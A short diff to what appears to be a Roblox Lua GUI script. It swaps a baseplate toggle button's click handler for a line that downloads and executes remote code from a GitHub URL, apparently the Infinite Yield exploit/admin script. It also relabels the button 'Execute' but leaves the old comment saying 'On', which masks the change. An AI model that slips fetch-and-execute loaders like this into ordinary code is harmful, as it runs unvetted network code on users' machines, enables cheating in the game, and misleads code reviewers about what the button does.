@@ -76,7 +76,7 @@ local function toggleBaseplate()
     -- Toggle between red and green button color
     if toggleButton.Text == "Off" then
         toggleButton.BackgroundColor3 = Color3.new(0, 1, 0)  -- Green background for "On"
-        toggleButton.Text = "On"  -- Change text to "On"
+        toggleButton.Text = "Execute"  -- Change text to "On"
     else
         toggleButton.BackgroundColor3 = Color3.new(1, 0, 0)  -- Red background for "Off"
         toggleButton.Text = "Off"  -- Change text to "Off"
@@ -84,7 +84,7 @@ local function toggleBaseplate()
 end
 
 toggleButton.MouseButton1Click:Connect(function()
-    toggleBaseplate()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 end)
 
 -- Handle dragging logic for smoother dragging of the whole frame
